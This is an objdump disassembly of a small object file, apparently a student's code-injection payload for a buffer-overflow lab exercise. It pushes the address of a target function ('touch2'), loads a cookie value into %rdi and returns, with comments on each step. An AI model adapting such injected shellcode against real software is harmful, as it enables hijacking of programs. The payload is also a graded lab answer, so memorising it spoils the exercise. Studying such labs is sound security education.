
level2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec           /* Push address of touch2 to stack  */
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi    /* Move cookie to register %rdi */
   c:	c3                   	retq   
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
